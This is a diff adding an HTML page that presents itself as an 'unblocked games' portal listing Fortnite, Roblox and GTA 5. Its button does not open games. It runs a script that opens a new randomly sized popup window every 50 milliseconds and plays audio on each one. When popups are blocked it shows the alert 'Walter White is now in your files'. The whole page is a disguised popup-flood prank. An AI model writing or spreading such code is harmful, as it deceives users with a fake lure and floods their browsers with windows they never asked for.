@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>UnblockedGames</title>
+    <h1>do not run code with pop up blockers off</h1>
+    <link rel="icon" href="https://codehs.com/uploads/700e27af664c5d55303bfe3a5058b3d0" type="image/png">
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            background-color: white;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            color: white;
+        }
+        .button {
+            font-size: 24px;
+            padding: 20px 40px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        #terms {
+            width: 80%;
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border-radius: 8px;
+            text-align: justify;
+            color: black; 
+        }
+    </style>
+    <script>
+        function openTabs() {
+            let i = 0;
+
+            function getRandomPosition() {
+                let width = window.innerWidth;
+                let height = window.innerHeight;
+                let radius = Math.min(width, height) / 2 - 100;
+                let angle = Math.random() * Math.PI * 2;
+                let randomX = Math.floor(width / 2 + radius * Math.cos(angle));
+                let randomY = Math.floor(height / 2 + radius * Math.sin(angle));
+                return [randomX, randomY];
+            }
+
+            function getRandomSize() {
+                let minWidth = 200;
+                let maxWidth = 1200;
+                let minHeight = 200;
+                let maxHeight = 800;
+                let randomWidth = Math.floor(Math.random() * (maxWidth - minWidth + 1)) + minWidth;
+                let randomHeight = Math.floor(Math.random() * (maxHeight - minHeight + 1)) + minHeight;
+                return [randomWidth, randomHeight];
+            }
+
+            function openNewWindow() {
+                let url = "https://codehs.com/uploads/e14e631666315d61fc8a99e36311000a";
+                let [x, y] = getRandomPosition();
+                let [width, height] = getRandomSize();
+
+                let newWindow = window.open(url, "_blank", `width=${width},height=${height},left=${x},top=${y}`);
+
+                if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
+                    clearInterval(interval);
+                    console.log("Stopped opening new windows.");
+                    window.alert("Walter White is now in your files");
+                }
+
+                i++;
+                console.log("Opened window " + i);
+
+                
+                let audio = new Audio("https://codehs.com/uploads/799ac00ae7046243b8de38c3ef012e81");
+                audio.play();
+            }
+
+            let interval = setInterval(openNewWindow, 50);
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById("terms").innerHTML += "<h1>unblocked games:</h1>";
+            document.getElementById("terms").innerHTML += "<ul>";
+            document.getElementById("terms").innerHTML += "<li>fortnite</li>";
+            document.getElementById("terms").innerHTML += "<li>now.gg/roblox</li>";
+            document.getElementById("terms").innerHTML += "<li>gta 5</li>";
+            document.getElementById("terms").innerHTML += "</ul>";
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div id="terms">
+            <h1></h1>
+            <p></p>
+        </div>
+        <button class="button" onclick="openTabs()">Click to open unblocked games</button>
+    </div>
+</body>
+</html>
